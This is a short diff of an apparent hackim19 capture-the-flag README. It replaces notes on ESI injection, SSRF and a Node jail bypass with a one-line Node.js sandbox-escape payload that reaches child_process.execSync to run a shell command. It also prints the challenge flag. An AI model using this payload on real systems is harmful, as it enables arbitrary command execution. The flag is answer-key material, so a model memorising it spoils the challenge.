@@ -3,9 +3,8 @@
 # flag: hackim19{S@ndbox_0_h4cker_1}
 
 # solution
-- Need to perform ESI Injection on description
-- SSRF to Admin 
-- Admin to bypass node jail shell
+
+- Object.getOwnPropertyDescriptor(Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),"constructor").value("return+process")().mainModule.require("child_process").execSync("cat+iamnotwhatyouthink").toString()
 
 #Installation
 - run ./start.sh
